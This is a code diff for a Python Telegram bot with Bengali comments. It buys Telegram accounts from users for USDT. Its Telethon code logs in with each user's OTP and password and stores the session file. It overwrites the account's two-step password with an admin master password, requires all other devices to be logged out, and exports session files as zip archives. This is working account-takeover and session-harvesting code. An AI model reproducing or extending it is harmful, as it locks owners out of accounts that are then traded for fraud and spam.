@@ -34,7 +34,7 @@ DEFAULT_SETTINGS = {
     "country_delays": {"52": 600, "60": 600, "49": 600, "54": 600, "880": 600, "57": 600}
 }
 
-# ==================== ডাটাবেস ও কনফিগ লোডার ====================
+# ==================== ডাটাবেস কন্ট্রোলার ====================
 def load_settings():
     if os.path.exists(SETTINGS_FILE):
         try:
@@ -62,6 +62,21 @@ def save_db(db):
     try:
         with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
     except: pass
+
+def is_number_already_verified(phone_number):
+    db = load_db()
+    # ডাটাবেসে ভেরিফাইড লিস্ট ট্র্যাকিংয়ের জন্য
+    if "verified_numbers" not in db:
+        db["verified_numbers"] = []
+        save_db(db)
+    return phone_number in db["verified_numbers"]
+
+def add_to_verified_numbers(phone_number):
+    db = load_db()
+    if "verified_numbers" not in db: db["verified_numbers"] = []
+    if phone_number not in db["verified_numbers"]:
+        db["verified_numbers"].append(phone_number)
+    save_db(db)
 
 def get_user_stats(user_id):
     db = load_db()
@@ -106,7 +121,7 @@ def get_current_file_count(country_code):
     try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
     except: return 0
 
-# ==================== FLASK UPTIME WEB SERVER ====================
+# ==================== FLASK SERVER ====================
 app = Flask("UptimeServer")
 
 @app.route('/')
@@ -130,7 +145,7 @@ def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
 
-# ==================== TELEGRAM BOT MAIN CORE ====================
+# ==================== TELEGRAM BOT CORE ====================
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
 user_data = {}
 admin_state = {}
@@ -192,15 +207,14 @@ def cmd_account(message):
     )
     bot.send_message(message.chat.id, response)
 
-# ==================== উইথড্রয়াল গেটওয়ে সিস্টেম ====================
+# ==================== উইথড্রয়াল সিস্টেম ====================
 @bot.message_handler(commands=['withdraw'])
 def cmd_withdraw(message):
     user_id = message.from_user.id
     stats = get_user_stats(user_id)
     
-    # রিকোয়ারমেন্ট অনুযায়ী শর্ত ১টি ভেরিফাইড অ্যাকাউন্ট করা হয়েছে
     if stats['verified'] < 1 or stats['verified_balance'] <= 0.0:
-        bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal condition is at least 1 verified account and more than 0.00 USDT Verified Balance.**")
+        bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal condition is at least 1 verified account and valid balance.**")
         return
         
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -216,61 +230,51 @@ def handle_withdraw_selection(call):
     bot.delete_message(call.message.chat.id, call.message.message_id)
     
     if call.data == "wtd_card":
-        bot.send_message(call.message.chat.id, "💳 **Send your card info:**\n_(You can type your bank or card details here)_")
+        bot.send_message(call.message.chat.id, "💳 **Send your card info:**")
         admin_state[user_id] = "wait_wtd_card"
     elif call.data == "wtd_bep20":
         bot.send_message(call.message.chat.id, "🪙 **Send your USDT BEP-20 Address:**\n\n⚠️ *Must be 42 characters long and start with '0x'*")
         admin_state[user_id] = "wait_wtd_bep20"
 
-# ==================== এডমিন এক্সপোর্ট ও জিপ ফাইল এক্সপোর্টার ====================
+# ==================== এডমিন সেশন এক্সপোর্টার ====================
 @bot.message_handler(commands=['export'])
 def cmd_export_sessions(message):
     if message.from_user.id != ADMIN_ID: return
-    
-    # কমান্ড ফরম্যাট: /export 880 5
     args = message.text.split()
     if len(args) < 3:
-        bot.reply_to(message, "⚠️ **Usage Format:** `/export <country_code> <amount>`\nExample: `/export 880 5`")
+        bot.reply_to(message, "⚠️ **Format:** `/export <country_code> <amount>`")
         return
         
     country_code = args[1].replace("+", "").strip()
     try: amount = int(args[2])
-    except:
-        bot.reply_to(message, "❌ Invalid number of files.")
-        return
+    except: return
         
     target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
     if not os.path.exists(target_dir):
-        bot.reply_to(message, f"❌ No sessions found for country code `+{country_code}`")
+        bot.reply_to(message, f"❌ No sessions for `+{country_code}`")
         return
         
-    # .session ফাইল ফিল্টারিং
     all_files = [f for f in os.listdir(target_dir) if f.endswith(".session")]
     all_files.sort(key=lambda x: os.path.getmtime(os.path.join(target_dir, x)), reverse=True)
     
-    if not all_files:
-        bot.reply_to(message, "❌ No active session files inside this directory.")
+    selected_files = all_files[:amount]
+    if not selected_files:
+        bot.reply_to(message, "❌ No files found.")
         return
         
-    selected_files = all_files[:amount]
-    zip_filename = f"Export_{country_code}_{datetime.now().strftime('%d%M%S')}.zip"
-    
+    zip_filename = f"Export_{country_code}.zip"
     try:
         with zipfile.ZipFile(zip_filename, 'w') as zipf:
             for file in selected_files:
-                file_path = os.path.join(target_dir, file)
-                zipf.write(file_path, arcname=file)
-                # একইসাথে সেফটির জন্য সেটার জার্নাল ফাইল থাকলে জিপে নিয়ে নেবে
-                journal = file + "-journal"
-                if os.path.exists(os.path.join(target_dir, journal)):
-                    zipf.write(os.path.join(target_dir, journal), arcname=journal)
+                zipf.write(os.path.join(target_dir, file), arcname=file)
+                jrnl = file + "-journal"
+                if os.path.exists(os.path.join(target_dir, jrnl)):
+                    zipf.write(os.path.join(target_dir, jrnl), arcname=jrnl)
                     
         with open(zip_filename, 'rb') as doc:
-            bot.send_document(message.chat.id, doc, caption=f"📦 Packed **{len(selected_files)}** session(s) from `+{country_code}` successfully.")
-            
+            bot.send_document(message.chat.id, doc, caption=f"📦 Exported {len(selected_files)} sessions.")
         os.remove(zip_filename)
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error creating backup zip: {e}")
+    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
 
 # ==================== এডমিন কন্ট্রোল প্যানেল ====================
 @bot.message_handler(commands=['panel'])
@@ -281,7 +285,7 @@ def admin_panel_command(message):
     markup.add(types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass"), types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country"))
     markup.add(types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"), types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close"))
     
-    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n📈 *Currently Allowed Countries:*\n"
+    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n📈 *Allowed Countries:*\n"
     for code in settings["country_prices"]:
         panel_msg += f"• 🌍 `+{code}` ➜ Price: **${settings['country_prices'][code]}** | Cap: **{settings['country_capacity'].get(code, 100)}**\n"
     bot.send_message(message.chat.id, panel_msg, reply_markup=markup)
@@ -295,25 +299,22 @@ def handle_admin_callbacks(call):
         bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
         admin_state[call.from_user.id] = "wait_pass"
     elif call.data == "pnl_set_country":
-        bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\n\nFormat: `Code=Price=Capacity=DelayTime`\nExample: `880=0.15=50=600`")
+        bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\nFormat: `Code=Price=Capacity=DelayTime`")
         admin_state[call.from_user.id] = "wait_country_all"
     elif call.data == "pnl_all_files":
         settings = load_settings()
-        total_files = 0
         file_msg = "📂 *Live Country Session Files Count:*\n\n"
         for code in settings["country_prices"]:
             count = get_current_file_count(code)
-            total_files += count
             file_msg += f"• 🌍 Country `+{code}` ➜ **{count} Pcs** Active\n"
-        file_msg += f"\n📊 *Total Active Database Sessions:* `{total_files} Pcs`"
         markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("⬅️ Back to Panel", callback_data="pnl_back"))
+        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="pnl_back"))
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup)
     elif call.data == "pnl_back":
         bot.delete_message(call.message.chat.id, call.message.message_id)
         admin_panel_command(call.message)
 
-# ==================== গ্লোবাল ইনপুট ও উইথড্র ভ্যালিডেশন ====================
+# ==================== টেক্সট মেসেজ ও ইনপুট হ্যান্ডলার ====================
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     user_id = message.from_user.id
@@ -322,29 +323,24 @@ def handle_text(message):
     if user_id in admin_state:
         state = admin_state[user_id]
         
-        # ইউজার উইথড্রয়াল হ্যান্ডলিং 
         if state == "wait_wtd_card":
             del admin_state[user_id]
             stats = get_user_stats(user_id)
-            bot.reply_to(message, "✅ **Your Card withdrawal request has been submitted successfully!**")
-            # এডমিনকে নোটিফিকেশন পাঠানো
-            bot.send_message(ADMIN_ID, f"📥 **New Card Withdrawal Request!**\n👤 User ID: `{user_id}`\n💰 Amount: {stats['verified_balance']} USDT\n💳 Details: {text}")
+            bot.reply_to(message, "✅ **Your Card withdrawal request has been submitted!**")
+            bot.send_message(ADMIN_ID, f"📥 **Withdraw Card!**\n👤 User: `{user_id}`\n💰 Amount: {stats['verified_balance']} USDT\n💳 Info: {text}")
             return
             
         elif state == "wait_wtd_bep20":
-            # USDT BEP-20 কঠোর সিকিউরিটি চেক (0x দিয়ে শুরু এবং ৪২ অক্ষর)
             if len(text) != 42 or not text.startswith("0x"):
-                bot.reply_to(message, "❌ **Invalid BEP-20 Address!**\n\nYour address must be exactly 42 characters long and start with **0x**. Please request again with correct address /withdraw.")
+                bot.reply_to(message, "❌ **Invalid BEP-20 Address!** Must be 42 chars long and start with **0x**.")
                 del admin_state[user_id]
                 return
-                
             del admin_state[user_id]
             stats = get_user_stats(user_id)
-            bot.reply_to(message, "✅ **Your USDT (BEP-20) withdrawal request has been submitted successfully!**")
-            bot.send_message(ADMIN_ID, f"📥 **New USDT BEP-20 Withdrawal Request!**\n👤 User ID: `{user_id}`\n💰 Amount: {stats['verified_balance']} USDT\n🪙 Address: `{text}`")
+            bot.reply_to(message, "✅ **Your USDT (BEP-20) withdrawal request has been submitted!**")
+            bot.send_message(ADMIN_ID, f"📥 **Withdraw BEP20!**\n👤 User: `{user_id}`\n💰 Amount: {stats['verified_balance']} USDT\n🪙 Addr: `{text}`")
             return
 
-        # এডমিন কন্ট্রোল সেটিংস আপডেটার
         if user_id == ADMIN_ID:
             settings = load_settings()
             del admin_state[user_id]
@@ -352,7 +348,7 @@ def handle_text(message):
                 if state == "wait_pass":
                     settings["security_password"] = text
                     save_settings(settings)
-                    bot.reply_to(message, f"✅ Updated to: `{text}`")
+                    bot.reply_to(message, f"✅ Updated: `{text}`")
                 elif state == "wait_country_all":
                     parts = text.split("=")
                     code = parts[0].strip().replace("+", "")
@@ -361,28 +357,36 @@ def handle_text(message):
                     if "country_delays" not in settings: settings["country_delays"] = {}
                     settings["country_delays"][code] = int(parts[3].strip())
                     save_settings(settings)
-                    bot.reply_to(message, f"✅ Country `+{code}` updated successfully.")
-            except Exception as e: bot.reply_to(message, f"❌ Format Error: {e}")
+                    bot.reply_to(message, f"✅ Country `+{code}` updated.")
+            except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
             return
 
-    # ওটিপি ট্র্যাকিং ফিল্টার
+    # ওটিপি / পাসওয়ার্ড সাবমিট হ্যান্ডলার
     if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
         asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
         return
 
-    # ফোন নম্বর ইনপুট ও কান্ট্রি ডিটেকশন
+    # ফোন নম্বর ইনপুট ডিটেকশন
     if text.startswith("+") or text.isdigit():
         phone = text if text.startswith("+") else f"+{text}"
+        clean_phone = phone.replace("+", "").replace(" ", "")
+        
+        # [ডুপ্লিকেট নম্বর প্রটেকশন চেক] - ছবি ১ রিকোয়ারমেন্ট
+        if is_number_already_verified(clean_phone):
+            bot.reply_to(message, "❌ This number already exists. Try another number.")
+            return
+            
         matched_code = check_valid_country_and_get_code(phone)
         if not matched_code:
             bot.reply_to(message, "❗you cannot at account from country.")
             return
+            
         processing_msg = bot.reply_to(message, "🔄 Processing please wait...")
         asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_code, user_id, message, processing_msg), bot_loop)
     else:
-        bot.reply_to(message, "❌ Invalid Command or Number format. Use /start to reset.")
+        bot.reply_to(message, "❌ Invalid Format. Use /start to reset.")
 
-# ==================== TELETHON ASYNC OPERATIONS ====================
+# ==================== TELETHON ASYNC BACKEND ====================
 async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
     settings = load_settings()
     if get_current_file_count(country_code) >= settings["country_capacity"].get(country_code, 9999):
@@ -397,73 +401,128 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
     try:
         await user_client.connect()
         sent_code = await user_client.send_code_request(phone_number)
-        user_data[user_id] = {"client": user_client, "phone": phone_number, "phone_code_hash": sent_code.phone_code_hash, "clean_phone": clean_phone, "session_path": final_session_path, "country_code": country_code}
+        user_data[user_id] = {
+            "client": user_client, "phone": phone_number, 
+            "phone_code_hash": sent_code.phone_code_hash, "clean_phone": clean_phone, 
+            "session_path": final_session_path, "country_code": country_code,
+            "has_existing_2fa": False
+        }
         bot.edit_message_text(f"🔢 Enter the code sent to the number or send the message.\n\n🇨🇴 ( `{phone_number}` )\n\n🦤 /cancel", message.chat.id, processing_msg.message_id)
     except Exception as e:
         bot.edit_message_text(f"❌ Error: {e}", message.chat.id, processing_msg.message_id)
 
 async def verify_otp_task(text, user_id, message):
     data = user_data[user_id]
+    settings = load_settings()
+    
+    # ইউজার যদি ২এফএ পাসওয়ার্ড সাবমিট করে
     if data.get("waiting_for_password"):
         try:
+            # প্রথমে ইউজারের এক্সিস্টিং পাসওয়ার্ড দিয়ে সাইন ইন করা
             await data["client"].sign_in(password=text)
+            
+            # [টেলিগ্রাম রিয়েল টু-স্টেপ ভেরিফিকেশন আপডেট লজিক]
+            # সাইন ইন সফল হলে সাথে সাথেই এডমিনের মাস্টার পাসওয়ার্ডটি দিয়ে একাউন্টের টু-স্টেপ চেঞ্জ/আপডেট করা
+            try:
+                await data["client"](functions.account.UpdatePasswordSettingsRequest(
+                    password=tl_types.InputCheckPasswordEmpty(),
+                    new_settings=tl_types.PasswordInputSettings(
+                        new_password=settings["security_password"], 
+                        hint="Cloud Lock"
+                    )
+                ))
+            except Exception as e:
+                # যদি ওল্ড পাসওয়ার্ড রিকোয়ার করে (ইনপুট চেকপাসওয়ার্ডএম্পটি ফেইল করলে)
+                try:
+                    # কারেন্ট পাসওয়ার্ড হ্যাশ জেনারেট করে আপডেট করা
+                    pwd_info = await data["client"](functions.account.GetPasswordRequest())
+                    my_hash = functions.account.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock")
+                    await data["client"](functions.account.UpdatePasswordSettingsRequest(password=pwd_info, new_settings=my_hash))
+                except: pass
+                
             await process_backup(user_id, message, data)
             del user_data[user_id]
-        except Exception as e: bot.reply_to(message, f"❌ Password Error: {e}")
+        except Exception as e: 
+            bot.reply_to(message, f"❌ Password Error: {e}")
     else:
+        # ওটিপি সাইন ইন ট্রাই
         try:
             await data["client"].sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
+            
+            # ওটিপি সাকসেস এবং ২এফএ নেই -> ডাইরেক্ট এডমিনের মাস্টার পাসওয়ার্ড টু-স্টেপে সেট করা
+            try:
+                await data["client"](functions.account.UpdatePasswordSettingsRequest(
+                    password=tl_types.InputCheckPasswordEmpty(),
+                    new_settings=tl_types.PasswordInputSettings(
+                        new_password=settings["security_password"], 
+                        hint="Cloud Lock"
+                    )
+                ))
+            except: pass
+            
             await process_backup(user_id, message, data)
             del user_data[user_id]
         except SessionPasswordNeededError:
+            # অ্যাকাউন্টে আগে থেকে ২এফএ পাসওয়ার্ড লাগানো আছে, তাই ইউজারের থেকে চাওয়া হচ্ছে
             bot.reply_to(message, "🔐 Two-step verification active. Enter Password:")
             user_data[user_id]["waiting_for_password"] = True
-        except Exception as e: bot.reply_to(message, f"❌ OTP Error: {e}")
+        except Exception as e: 
+            bot.reply_to(message, f"❌ OTP Error: {e}")
 
 async def process_backup(user_id, message, data):
     settings = load_settings()
     delay = settings.get("country_delays", {}).get(data['country_code'], 600)
     price = settings["country_prices"].get(data['country_code'], 0.24)
     
+    # ইনিশিয়ালি টাকাটি ইউজারের পেন্ডিং ও আন-ভেরিফাইড ড্যাশবোর্ডে যোগ হলো
     add_user_pending_account(user_id, price)
     
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
     bot.reply_to(message, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : 🕊️ Free As Bird", reply_markup=markup)
     
+    # প্রথম নির্দিষ্ট টাইমার পর্যন্ত অপেক্ষা
     await asyncio.sleep(delay)
-    try:
-        if not await data["client"].is_user_authorized():
-            reject_pending_account(user_id, price)
-            return
-            
-        auths = await data["client"](functions.account.GetAuthorizationsRequest())
-        # [মাল্টিপল ডিভাইস ফিল্টারিং]
-        if len([a for a in auths.authorizations if not a.current]) > 0:
-            bot.send_message(message.chat.id, f"❌ **Verification Failed!** Other active devices detected on `{data['phone']}`. Account rejected.")
-            reject_pending_account(user_id, price)
-            await data["client"].disconnect()
-            try:
-                for ext in [".session", ".session-journal"]:
-                    os.remove(data["session_path"] + ext)
-            except: pass
-            return
-        
-        # ২এফএ প্রোটেকশন সেটআপ 
+    
+    max_wait_extended = 3600  # অতিরিক্ত ১ ঘণ্টা ডিভাইস ক্লিয়ার করার সুযোগ (ছবি ২ লজিক)
+    interval = 60             # প্রতি ৬০ সেকেন্ড পর পর ব্যাকগ্রাউন্ড চেক লুপ
+    elapsed = 0
+    
+    while elapsed <= max_wait_extended:
         try:
-            await data["client"](functions.account.UpdatePasswordSettingsRequest(
-                password=tl_types.InputCheckPasswordEmpty(),
-                new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock")
-            ))
-        except: pass
-        
-        await data["client"].disconnect()
-        convert_pending_to_verified(user_id, price)
-        bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
-        bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
-    except:
-        reject_pending_account(user_id, price)
+            await data["client"].connect()
+            if not await data["client"].is_user_authorized():
+                reject_pending_account(user_id, price)
+                return
+                
+            auths = await data["client"](functions.account.GetAuthorizationsRequest())
+            other_devices = [a for a in auths.authorizations if not a.current]
+            
+            # যদি অন্য কোনো ডিভাইস না থাকে (শুধু বটের নিজস্ব সেশনটিই একটিভ আছে) -> CLAIM SUCCESS
+            if len(other_devices) == 0:
+                await data["client"].disconnect()
+                convert_pending_to_verified(user_id, price)
+                add_to_verified_numbers(data["clean_phone"]) # ডুপ্লিকেট লিস্টে নম্বর লক করা হলো
+                bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
+                bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
+                return
+            else:
+                # যদি অন্য ডিভাইস থাকে এবং এটিই প্রথম চেক হয়, ইউজারকে ওয়ার্নিং এলার্ট দেওয়া (ছবি ২ এর মতো)
+                if elapsed == 0:
+                    bot.send_message(message.chat.id, f"⚠️ **Device Detected on `{data['phone']}`!**\n\nYour account has other active sessions. You have **1 hour** to clear all other devices from Telegram Settings and keep only this robot session, or it will be rejected.")
+            
+            await data["client"].disconnect()
+        except:
+            pass
+            
+        await asyncio.sleep(interval)
+        elapsed += interval
 
+    # ১ ঘণ্টার মধ্যেও যদি ইউজার সেশন ক্লিয়ার না করে, রিজেক্ট করা হবে এবং টাকা আন-ভেরিফাইডেই থেকে যাবে
+    reject_pending_account(user_id, price)
+    bot.send_message(message.chat.id, f"❌ **Verification Failed!** You did not clear other devices within 1 hour for `{data['phone']}`. Account rejected.")
+
+# ==================== মেইন থ্রেড রানার ====================
 if __name__ == "__main__":
     flask_thread = Thread(target=run_flask, daemon=True)
     flask_thread.start()
